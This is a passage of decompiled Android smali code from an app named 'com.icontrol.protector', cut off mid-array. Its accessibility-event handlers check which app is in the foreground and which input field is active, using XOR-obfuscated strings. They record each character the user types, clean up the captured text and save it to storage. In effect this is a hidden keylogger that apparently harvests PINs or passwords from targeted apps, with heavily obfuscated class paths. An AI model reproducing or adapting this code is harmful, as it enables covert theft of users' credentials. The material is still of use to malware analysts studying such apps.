.class public abstract Lcom/icontrol/protector/i;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static a:Z = false

.field public static b:Z = false

.field public static c:Ljava/lang/String; = ""

.field public static d:Ljava/lang/String; = ""

.field static e:Ljava/util/List;

.field public static f:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/i;->e:Ljava/util/List;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/icontrol/protector/i;->f:Z

    return-void
.end method

.method private static a(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x34

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    const/16 v4, 0x8

    new-array v6, v4, [B

    fill-array-data v6, :array_0

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/16 v6, 0x25

    const-string v7, ""

    if-eqz v3, :cond_1

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-nez v3, :cond_1

    new-array v3, v6, [B

    fill-array-data v3, :array_1

    new-array v8, v4, [B

    fill-array-data v8, :array_2

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sput-boolean v2, Lcom/icontrol/protector/i;->a:Z

    sput-object v7, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_1
    new-array v3, v2, [B

    const/16 v8, -0x3c

    aput-byte v8, v3, v5

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v8, 0x3

    if-eqz v3, :cond_3

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v9, 0x2000

    if-ne v3, v9, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_2

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    sub-int/2addr v3, v2

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_2
    move-object p0, v7

    :goto_0
    new-array v3, v8, [B

    fill-array-data v3, :array_4

    new-array v9, v4, [B

    fill-array-data v9, :array_5

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_3
    new-array p0, v2, [B

    const/16 v3, -0x4b

    aput-byte v3, p0, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_6

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_4

    sget-boolean p0, Lcom/icontrol/protector/i;->a:Z

    if-eqz p0, :cond_4

    new-array p0, v6, [B

    fill-array-data p0, :array_7

    new-array v0, v4, [B

    fill-array-data v0, :array_8

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-nez p0, :cond_4

    sput-boolean v5, Lcom/icontrol/protector/i;->a:Z

    sget-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    new-array v0, v8, [B

    fill-array-data v0, :array_9

    new-array v1, v4, [B

    fill-array-data v1, :array_a

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_b

    new-array v1, v4, [B

    fill-array-data v1, :array_c

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    new-array p0, v6, [B

    fill-array-data p0, :array_d

    new-array v0, v4, [B

    fill-array-data v0, :array_e

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_f

    new-array v3, v4, [B

    fill-array-data v3, :array_10

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v2, [B

    const/16 v3, -0x2c

    aput-byte v3, v2, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_11

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_12

    new-array v2, v4, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_14

    new-array v2, v4, [B

    fill-array-data v2, :array_15

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x4t
        0x45t
        -0x55t
        -0x17t
        -0x7et
        -0x50t
        0x75t
        -0x75t
    .end array-data

    :array_1
    .array-data 1
        -0x3et
        0x2et
        -0x15t
        -0x4t
        0x3et
        0x25t
        0x7et
        0x5at
        -0x32t
        0x28t
        -0x1et
        -0x4t
        0x2ct
        0x32t
        0x69t
        0x5ct
        -0x3ct
        0x2ct
        -0xdt
        -0x45t
        0x65t
        0x22t
        0x7et
        0x7t
        -0x2ft
        0x20t
        -0xbt
        -0x5ft
        0x28t
        0x24t
        0x68t
        0x4ct
        -0x1ct
        0x2ft
        -0xet
        -0x60t
        0x26t
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x5ft
        0x41t
        -0x7at
        -0x2et
        0x5ft
        0x4bt
        0x1at
        0x28t
    .end array-data

    :array_3
    .array-data 1
        -0xct
        0x47t
        -0x3ft
        0x69t
        0x67t
        -0x80t
        0xct
        -0x52t
    .end array-data

    :array_4
    .array-data 1
        0x9t
        -0x38t
        -0x1at
    .end array-data

    :array_5
    .array-data 1
        -0x15t
        0x48t
        0x44t
        0x8t
        -0x11t
        -0x4ft
        0x62t
        -0x20t
    .end array-data

    :array_6
    .array-data 1
        -0x79t
        -0x1ct
        0x4dt
        0x6ct
        -0x2ct
        0x24t
        -0x37t
        -0x1ct
    .end array-data

    :array_7
    .array-data 1
        0x29t
        -0x58t
        0x21t
        0x24t
        0x2ct
        -0x27t
        -0x16t
        0x15t
        0x25t
        -0x52t
        0x28t
        0x24t
        0x3et
        -0x32t
        -0x3t
        0x13t
        0x2ft
        -0x56t
        0x39t
        0x63t
        0x77t
        -0x22t
        -0x16t
        0x48t
        0x3at
        -0x5at
        0x3ft
        0x79t
        0x3at
        -0x28t
        -0x4t
        0x3t
        0xft
        -0x57t
        0x38t
        0x78t
        0x34t
    .end array-data

    nop

    :array_8
    .array-data 1
        0x4at
        -0x39t
        0x4ct
        0xat
        0x4dt
        -0x49t
        -0x72t
        0x67t
    .end array-data

    :array_9
    .array-data 1
        0x77t
        0x69t
        0x32t
    .end array-data

    :array_a
    .array-data 1
        -0x6bt
        -0x17t
        -0x70t
        0x16t
        -0x18t
        0x59t
        0x14t
        0x0t
    .end array-data

    :array_b
    .array-data 1
        -0x3t
        0x57t
        -0x27t
        0x77t
        0x32t
        -0x3dt
        -0x1et
        0xdt
        -0x6t
        0x7et
        -0x6bt
        0x25t
        0x36t
        -0x3at
        -0x71t
    .end array-data

    :array_c
    .array-data 1
        -0x5at
        0xbt
        -0x54t
        0x43t
        0x57t
        -0xdt
        -0x2et
        0x20t
    .end array-data

    :array_d
    .array-data 1
        0xdt
        -0x4ft
        -0x80t
        0x69t
        -0x5ct
        0x66t
        0x43t
        0x72t
        0x1t
        -0x49t
        -0x77t
        0x69t
        -0x4at
        0x71t
        0x54t
        0x74t
        0xbt
        -0x4dt
        -0x68t
        0x2et
        -0x1t
        0x61t
        0x43t
        0x2ft
        0x1et
        -0x41t
        -0x62t
        0x34t
        -0x4et
        0x67t
        0x55t
        0x64t
        0x2bt
        -0x50t
        -0x67t
        0x35t
        -0x44t
    .end array-data

    nop

    :array_e
    .array-data 1
        0x6et
        -0x22t
        -0x13t
        0x47t
        -0x3bt
        0x8t
        0x27t
        0x0t
    .end array-data

    :array_f
    .array-data 1
        0x23t
        -0x8t
        0x58t
    .end array-data

    :array_10
    .array-data 1
        0x42t
        -0x75t
        0x3ct
        -0xbt
        -0xet
        0x13t
        -0x3t
        -0x3bt
    .end array-data

    :array_11
    .array-data 1
        -0x1ft
        -0x59t
        0x16t
        -0x40t
        0x4bt
        -0x19t
        -0x53t
        -0x63t
    .end array-data

    :array_12
    .array-data 1
        -0xft
        0x41t
        0x47t
    .end array-data

    :array_13
    .array-data 1
        -0x67t
        0x38t
        0x37t
        -0x5ft
        -0x68t
        -0x25t
        -0x56t
        -0x1dt
    .end array-data

    :array_14
    .array-data 1
        -0x7ft
        -0x72t
        -0x3t
        0x6bt
    .end array-data

    :array_15
    .array-data 1
        -0x17t
        -0x9t
        -0x73t
        0xft
        0x11t
        -0x71t
        -0x62t
        0x6dt
    .end array-data
.end method

.method private static b(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x6e

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    const/16 v4, 0x8

    new-array v6, v4, [B

    fill-array-data v6, :array_0

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/16 v6, 0x25

    const-string v7, ""

    if-eqz v3, :cond_1

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-nez v3, :cond_1

    new-array v3, v6, [B

    fill-array-data v3, :array_1

    new-array v8, v4, [B

    fill-array-data v8, :array_2

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sput-boolean v2, Lcom/icontrol/protector/i;->a:Z

    sput-object v7, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_1
    new-array v3, v2, [B

    const/16 v8, 0x38

    aput-byte v8, v3, v5

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v8, 0x3

    if-eqz v3, :cond_3

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v9, 0x2000

    if-ne v3, v9, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_2

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    sub-int/2addr v3, v2

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_2
    move-object p0, v7

    :goto_0
    new-array v3, v8, [B

    fill-array-data v3, :array_4

    new-array v9, v4, [B

    fill-array-data v9, :array_5

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_3
    new-array p0, v2, [B

    const/16 v3, 0x37

    aput-byte v3, p0, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_6

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_4

    sget-boolean p0, Lcom/icontrol/protector/i;->a:Z

    if-eqz p0, :cond_4

    new-array p0, v6, [B

    fill-array-data p0, :array_7

    new-array v0, v4, [B

    fill-array-data v0, :array_8

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-nez p0, :cond_4

    sput-boolean v5, Lcom/icontrol/protector/i;->a:Z

    sget-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    new-array v0, v8, [B

    fill-array-data v0, :array_9

    new-array v1, v4, [B

    fill-array-data v1, :array_a

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_b

    new-array v1, v4, [B

    fill-array-data v1, :array_c

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    new-array p0, v6, [B

    fill-array-data p0, :array_d

    new-array v0, v4, [B

    fill-array-data v0, :array_e

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_f

    new-array v3, v4, [B

    fill-array-data v3, :array_10

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v2, [B

    const/16 v3, -0x11

    aput-byte v3, v2, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_11

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_12

    new-array v2, v4, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_14

    new-array v2, v4, [B

    fill-array-data v2, :array_15

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x5et
        -0x5t
        0x74t
        -0x45t
        0x7ct
        0x65t
        0x6t
        0x44t
    .end array-data

    :array_1
    .array-data 1
        -0x51t
        0x9t
        -0x2et
        -0x5at
        -0x42t
        -0xdt
        0x18t
        0x77t
        -0x5dt
        0xft
        -0x25t
        -0x5at
        -0x54t
        -0x1ct
        0xft
        0x71t
        -0x57t
        0xbt
        -0x36t
        -0x1ft
        -0x1bt
        -0xct
        0x18t
        0x2at
        -0x44t
        0x7t
        -0x34t
        -0x5t
        -0x58t
        -0xet
        0xet
        0x61t
        -0x77t
        0x8t
        -0x35t
        -0x6t
        -0x5at
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x34t
        0x66t
        -0x41t
        -0x78t
        -0x21t
        -0x63t
        0x7ct
        0x5t
    .end array-data

    :array_3
    .array-data 1
        0x8t
        -0x6bt
        -0x16t
        -0x21t
        0x63t
        -0x5dt
        0x67t
        0x7dt
    .end array-data

    :array_4
    .array-data 1
        0x27t
        -0x42t
        0xct
    .end array-data

    :array_5
    .array-data 1
        -0x3bt
        0x3et
        -0x52t
        0x1ct
        0x63t
        -0x31t
        0x35t
        0x1at
    .end array-data

    :array_6
    .array-data 1
        0x5t
        0x66t
        0x6ct
        0x2bt
        -0x4ft
        -0x5et
        0x39t
        -0x18t
    .end array-data

    :array_7
    .array-data 1
        0x37t
        0x29t
        -0x67t
        0x23t
        0x1ft
        0xdt
        0x14t
        0x69t
        0x3bt
        0x2ft
        -0x70t
        0x23t
        0xdt
        0x1at
        0x3t
        0x6ft
        0x31t
        0x2bt
        -0x7ft
        0x64t
        0x44t
        0xat
        0x14t
        0x34t
        0x24t
        0x27t
        -0x79t
        0x7et
        0x9t
        0xct
        0x2t
        0x7ft
        0x11t
        0x28t
        -0x80t
        0x7ft
        0x7t
    .end array-data

    nop

    :array_8
    .array-data 1
        0x54t
        0x46t
        -0xct
        0xdt
        0x7et
        0x63t
        0x70t
        0x1bt
    .end array-data

    :array_9
    .array-data 1
        0x71t
        -0x21t
        -0x43t
    .end array-data

    :array_a
    .array-data 1
        -0x6dt
        0x5ft
        0x1ft
        0x34t
        0x6dt
        -0xdt
        -0x70t
        -0x66t
    .end array-data

    :array_b
    .array-data 1
        -0xdt
        0x67t
        -0x1bt
        0x3t
        0x1dt
        -0x66t
        0x64t
        -0x70t
        -0xct
        0x4et
        -0x57t
        0x51t
        0x19t
        -0x61t
        0x9t
    .end array-data

    :array_c
    .array-data 1
        -0x58t
        0x3bt
        -0x70t
        0x37t
        0x78t
        -0x56t
        0x54t
        -0x43t
    .end array-data

    :array_d
    .array-data 1
